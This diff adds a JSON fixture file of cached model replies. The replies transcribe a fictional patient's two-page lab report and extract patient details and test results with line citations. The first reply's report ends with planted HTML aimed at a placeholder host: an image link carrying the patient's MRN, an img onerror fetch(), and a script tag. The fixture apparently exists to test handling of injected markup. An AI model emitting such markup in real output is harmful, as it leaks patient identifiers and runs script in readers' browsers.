@@ -1,0 +1,105 @@
+{
+ "version": 1,
+ "entries": [
+  {
+   "model": "qwen3.5:4b",
+   "digest": "d8b0f5e9760cd1682034f292d7ef72ec46f432149be0df7574bf2d6e92e38c04",
+   "request": "06ed9d3408695de75a2ec406bd3f897f06f7ae187314136fc5c1f5a37898d6d7",
+   "prompt": "b4e85ef6e706f6152073580ce57c6c7a0ed19a84aee90577742526e019168db7",
+   "input": "b6c0fcaed8afbd1f9d14e88e15c6a9b8417869e8926f5781c0fd196751ad11cc",
+   "options": "13b06877d71ea1614f07c39653bc9f119ea129f0ceb6e21ac304a76977a68f0a",
+   "reply": "# Sahaj Multispeciality Hospital - Laboratory Services\nKarve Road, Pune 411004\nPatient Name: Mr. Arjun Menon\nAge / Sex: 66 Years / Male\nUHID: SH-100234\nOrdering Physician: Dr. Anil Deshpande\nSample Collected: 04/03/2025 08:45 AM\nReport Date: 04/03/2025 03:30 PM\n\n## LIPID PROFILE\n\n| Test | Result | Flag | Unit | Reference Range |\n| :--- | :--- | :--- | :--- | :--- |\n| Total Cholesterol | 236 | H | mg/dL | Desirable: < 200; Borderline: 200 - 239; High: >= 240 |\n| Triglycerides | 210 | H | mg/dL | < 150 |\n| HDL Cholesterol | 38 | L | mg/dL | > 40 |\n| LDL Cholesterol | 156 | H | mg/dL | Optimal: < 100; Near optimal: 100 - 129; Borderline high: 130 - 159; High: >= 160 |\n\n## GLYCATED HAEMOGLOBIN\n\n| Test | Result | Flag | Unit | Reference Range |\n| :--- | :--- | :--- | :--- | :--- |\n| HbA1c | 6.2 | | % | Normal: < 5.7; Prediabetes: 5.7 - 6.4; Diabetes: >= 6.5 |\n\n![trend chart](https://cdn.example.invalid/chart.png?mrn=SH-100234) <img src=\"https://cdn.example.invalid/pixel.gif\" onerror=\"fetch('https://cdn.example.invalid/c')\"> <script src=\"https://cdn.example.invalid/report.js\"></script>\n\nSynthetic test document: fictional patient, doctors and laboratory.",
+   "done_reason": "stop",
+   "done": {
+    "prompt_eval_count": 4242,
+    "eval_count": 472,
+    "total_duration": 262768520900,
+    "load_duration": 13059300,
+    "prompt_eval_duration": 206725639000,
+    "eval_duration": 55826062000
+   },
+   "tool_calls": [],
+   "seed": 0
+  },
+  {
+   "model": "qwen3.5:4b",
+   "digest": "d8b0f5e9760cd1682034f292d7ef72ec46f432149be0df7574bf2d6e92e38c04",
+   "request": "781d2c6081ecc1e28e15fad690ccef6d26cdd2c936807ee21c8244d78dda7c51",
+   "prompt": "b4e85ef6e706f6152073580ce57c6c7a0ed19a84aee90577742526e019168db7",
+   "input": "45593a08273dc02c104d8a77c338888cb2735bfab35468c14d8808852bcdf262",
+   "options": "13b06877d71ea1614f07c39653bc9f119ea129f0ceb6e21ac304a76977a68f0a",
+   "reply": "Patient: Mr. Arjun Menon | UHID: SH-100234 | Page 2 of 2\n\n## URINE ROUTINE\n\n| Test | Result | Flag | Unit | Reference Range |\n| --- | --- | --- | --- | --- |\n| Urine Sugar | Absent |  |  | Absent |\n| Urine Protein | Trace | * |  | Absent |\n| Pus Cells | 4-6 | H | /hpf | 0 - 5 |\n\n## SERUM PSA\n\n| Test | Result | Flag | Unit | Reference Range |\n| --- | --- | --- | --- | --- |\n| Total PSA | 3.1 |  | ng/mL | < 4.0 |\n\nDr. Neha Joshi, MD (Pathology)\n\n*** End of Report ***\n\nSynthetic test document: fictional patient, doctors and laboratory.",
+   "done_reason": "stop",
+   "done": {
+    "prompt_eval_count": 4242,
+    "eval_count": 201,
+    "total_duration": 230537445300,
+    "load_duration": 7604600,
+    "prompt_eval_duration": 206946479000,
+    "eval_duration": 23371440000
+   },
+   "tool_calls": [],
+   "seed": 0
+  },
+  {
+   "model": "qwen3.5:4b",
+   "digest": "d8b0f5e9760cd1682034f292d7ef72ec46f432149be0df7574bf2d6e92e38c04",
+   "request": "fea827e36dd5b916d934caff286b92f3d73c9117852fbcc825b6633f4a58d458",
+   "prompt": "b888babbf1bb762af8ffbedab9550276fd58a282629a32b339751e96b9c60d4a",
+   "input": "032f5496f43e04979dbb6e33d97d3d459ee3981dfda74385cd0a0dd67b5e623a",
+   "options": "788e585c90fa3699b94c55711ccaa8375e58ec02f15b37944d3085cd77a8d1da",
+   "reply": "{\n  \"document_type\": \"lab_report\"\n}",
+   "done_reason": "stop",
+   "done": {
+    "prompt_eval_count": 851,
+    "eval_count": 14,
+    "total_duration": 15802640900,
+    "load_duration": 7411600,
+    "prompt_eval_duration": 14361198000,
+    "eval_duration": 1343700000
+   },
+   "tool_calls": [],
+   "seed": 0
+  },
+  {
+   "model": "qwen3.5:4b",
+   "digest": "d8b0f5e9760cd1682034f292d7ef72ec46f432149be0df7574bf2d6e92e38c04",
+   "request": "8d696179f0249fb15b0cc16c3572d3a72a65a6ea852fb67a433ecd14e3b1ee50",
+   "prompt": "ed9944df0cad3b8302c4a60c745790d244829ee829dc0130846bb295d5848219",
+   "input": "1f7c5cfda7e7fee139b54548222feb8454b3b0ba8c1d6f3eb45d37a9a114e734",
+   "options": "8f4dbb25b8c8852a3b30ecc9355dea4c56df72964dc48e256e1988543ec960ec",
+   "reply": "{\n  \"patient\": {\n    \"name\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 3,\n        \"last_line\": 3,\n        \"quote\": \"Patient Name: Mr. Arjun Menon\"\n      },\n      \"text\": \"Mr. Arjun Menon\"\n    },\n    \"age\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 4,\n        \"last_line\": 4,\n        \"quote\": \"Age / Sex: 66 Years / Male\"\n      },\n      \"text\": \"66 Years\"\n    },\n    \"sex\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 4,\n        \"last_line\": 4,\n        \"quote\": \"Age / Sex: 66 Years / Male\"\n      },\n      \"text\": \"Male\"\n    },\n    \"date_of_birth\": null,\n    \"patient_id\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 5,\n        \"last_line\": 5,\n        \"quote\": \"UHID: SH-100234\"\n      },\n      \"text\": \"SH-100234\"\n    }\n  },\n  \"details\": {\n    \"facility\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 1,\n        \"last_line\": 2,\n        \"quote\": \"# Sahaj Multispeciality Hospital - Laboratory Services\\nKarve Road, Pune 411004\"\n      },\n      \"text\": \"Sahaj Multispeciality Hospital\"\n    },\n    \"clinicians\": [\n      {\n        \"citation\": {\n          \"page\": 1,\n          \"first_line\": 6,\n          \"last_line\": 6,\n          \"quote\": \"Ordering Physician: Dr. Anil Deshpande\"\n        },\n        \"text\": \"Dr. Anil Deshpande\"\n      }\n    ],\n    \"report_date\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 8,\n        \"last_line\": 8,\n        \"quote\": \"Report Date: 04/03/2025 03:30 PM\"\n      },\n      \"text\": \"04/03/2025 03:30 PM\"\n    },\n    \"collection_date\": {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 7,\n        \"last_line\": 7,\n        \"quote\": \"Sample Collected: 04/03/2025 08:45 AM\"\n      },\n      \"text\": \"04/03/2025 08:45 AM\"\n    },\n    \"prescription_date\": null\n  },\n  \"results\": [\n    {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 14,\n        \"last_line\": 14,\n        \"quote\": \"| Total Cholesterol | 236 | H | mg/dL | Desirable: < 200; Borderline: 200 - 239; High: >= 240 |\"\n      },\n      \"panel\": \"LIPID PROFILE\",\n      \"test_name\": \"Total Cholesterol\",\n      \"value_text\": \"236\",\n      \"unit\": \"mg/dL\",\n      \"reference_ranges\": [\n        \"Desirable: < 200; Borderline: 200 - 239; High: >= 240\"\n      ],\n      \"flag_printed\": \"H\"\n    },\n    {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 15,\n        \"last_line\": 15,\n        \"quote\": \"| Triglycerides | 210 | H | mg/dL | < 150 |\"\n      },\n      \"panel\": \"LIPID PROFILE\",\n      \"test_name\": \"Triglycerides\",\n      \"value_text\": \"210\",\n      \"unit\": \"mg/dL\",\n      \"reference_ranges\": [\n        \"< 150\"\n      ],\n      \"flag_printed\": \"H\"\n    },\n    {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 16,\n        \"last_line\": 16,\n        \"quote\": \"| HDL Cholesterol | 38 | L | mg/dL | > 40 |\"\n      },\n      \"panel\": \"LIPID PROFILE\",\n      \"test_name\": \"HDL Cholesterol\",\n      \"value_text\": \"38\",\n      \"unit\": \"mg/dL\",\n      \"reference_ranges\": [\n        \"> 40\"\n      ],\n      \"flag_printed\": \"L\"\n    },\n    {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 17,\n        \"last_line\": 17,\n        \"quote\": \"| LDL Cholesterol | 156 | H | mg/dL | Optimal: < 100; Near optimal: 100 - 129; Borderline high: 130 - 159; High: >= 160 |\"\n      },\n      \"panel\": \"LIPID PROFILE\",\n      \"test_name\": \"LDL Cholesterol\",\n      \"value_text\": \"156\",\n      \"unit\": \"mg/dL\",\n      \"reference_ranges\": [\n        \"Optimal: < 100; Near optimal: 100 - 129; Borderline high: 130 - 159; High: >= 160\"\n      ],\n      \"flag_printed\": \"H\"\n    },\n    {\n      \"citation\": {\n        \"page\": 1,\n        \"first_line\": 23,\n        \"last_line\": 23,\n        \"quote\": \"| HbA1c | 6.2 | | % | Normal: < 5.7; Prediabetes: 5.7 - 6.4; Diabetes: >= 6.5 |\"\n      },\n      \"panel\": \"GLYCATED HAEMOGLOBIN\",\n      \"test_name\": \"HbA1c\",\n      \"value_text\": \"6.2\",\n      \"unit\": \"%\",\n      \"reference_ranges\": [\n        \"Normal: < 5.7; Prediabetes: 5.7 - 6.4; Diabetes: >= 6.5\"\n      ],\n      \"flag_printed\": null\n    }\n  ],\n  \"remarks\": [],\n  \"conditions\": [],\n  \"vitals\": [],\n  \"allergies\": []\n}",
+   "done_reason": "stop",
+   "done": {
+    "prompt_eval_count": 1605,
+    "eval_count": 1631,
+    "total_duration": 196699579800,
+    "load_duration": 10405400,
+    "prompt_eval_duration": 18411433000,
+    "eval_duration": 178215380000
+   },
+   "tool_calls": [],
+   "seed": 0
+  },
+  {
+   "model": "qwen3.5:4b",
+   "digest": "d8b0f5e9760cd1682034f292d7ef72ec46f432149be0df7574bf2d6e92e38c04",
+   "request": "b4e5d54c54e35f20ae668d981f844311c8a17e01e576ccad5ac3964d4321d732",
+   "prompt": "ed9944df0cad3b8302c4a60c745790d244829ee829dc0130846bb295d5848219",
+   "input": "db4be5faf8b107d175a241f1e2a541beaa6c5069c11ee3b2e4beea0d735974b2",
+   "options": "8f4dbb25b8c8852a3b30ecc9355dea4c56df72964dc48e256e1988543ec960ec",
+   "reply": "{\n  \"patient\": {\n    \"name\": {\n      \"citation\": {\n        \"page\": 2,\n        \"first_line\": 1,\n        \"last_line\": 1,\n        \"quote\": \"Patient: Mr. Arjun Menon\"\n      },\n      \"text\": \"Mr. Arjun Menon\"\n    },\n    \"age\": null,\n    \"sex\": null,\n    \"date_of_birth\": null,\n    \"patient_id\": {\n      \"citation\": {\n        \"page\": 2,\n        \"first_line\": 1,\n        \"last_line\": 1,\n        \"quote\": \"UHID: SH-100234\"\n      },\n      \"text\": \"SH-100234\"\n    }\n  },\n  \"details\": {\n    \"facility\": null,\n    \"clinicians\": [\n      {\n        \"citation\": {\n          \"page\": 2,\n          \"first_line\": 17,\n          \"last_line\": 17,\n          \"quote\": \"Dr. Neha Joshi, MD (Pathology)\"\n        },\n        \"text\": \"Dr. Neha Joshi, MD (Pathology)\"\n      }\n    ],\n    \"report_date\": null,\n    \"collection_date\": null,\n    \"prescription_date\": null\n  },\n  \"results\": [\n    {\n      \"citation\": {\n        \"page\": 2,\n        \"first_line\": 7,\n        \"last_line\": 7,\n        \"quote\": \"| Urine Sugar | Absent |  |  | Absent |\"\n      },\n      \"panel\": \"URINE ROUTINE\",\n      \"test_name\": \"Urine Sugar\",\n      \"value_text\": \"Absent\",\n      \"unit\": null,\n      \"reference_ranges\": [\n        \"Absent\"\n      ],\n      \"flag_printed\": null\n    },\n    {\n      \"citation\": {\n        \"page\": 2,\n        \"first_line\": 8,\n        \"last_line\": 8,\n        \"quote\": \"| Urine Protein | Trace | * |  | Absent |\"\n      },\n      \"panel\": \"URINE ROUTINE\",\n      \"test_name\": \"Urine Protein\",\n      \"value_text\": \"Trace\",\n      \"unit\": null,\n      \"reference_ranges\": [\n        \"Absent\"\n      ],\n      \"flag_printed\": \"*\"\n    },\n    {\n      \"citation\": {\n        \"page\": 2,\n        \"first_line\": 9,\n        \"last_line\": 9,\n        \"quote\": \"| Pus Cells | 4-6 | H | /hpf | 0 - 5 |\"\n      },\n      \"panel\": \"URINE ROUTINE\",\n      \"test_name\": \"Pus Cells\",\n      \"value_text\": \"4-6\",\n      \"unit\": \"/hpf\",\n      \"reference_ranges\": [\n        \"0 - 5\"\n      ],\n      \"flag_printed\": \"H\"\n    },\n    {\n      \"citation\": {\n        \"page\": 2,\n        \"first_line\": 15,\n        \"last_line\": 15,\n        \"quote\": \"| Total PSA | 3.1 |  | ng/mL | < 4.0 |\"\n      },\n      \"panel\": \"SERUM PSA\",\n      \"test_name\": \"Total PSA\",\n      \"value_text\": \"3.1\",\n      \"unit\": \"ng/mL\",\n      \"reference_ranges\": [\n        \"< 4.0\"\n      ],\n      \"flag_printed\": null\n    }\n  ],\n  \"remarks\": [],\n  \"conditions\": [],\n  \"vitals\": [],\n  \"allergies\": []\n}",
+   "done_reason": "stop",
+   "done": {
+    "prompt_eval_count": 1317,
+    "eval_count": 869,
+    "total_duration": 107444505800,
+    "load_duration": 10196800,
+    "prompt_eval_duration": 13716823000,
+    "eval_duration": 93640046000
+   },
+   "tool_calls": [],
+   "seed": 0
+  }
+ ]
+}
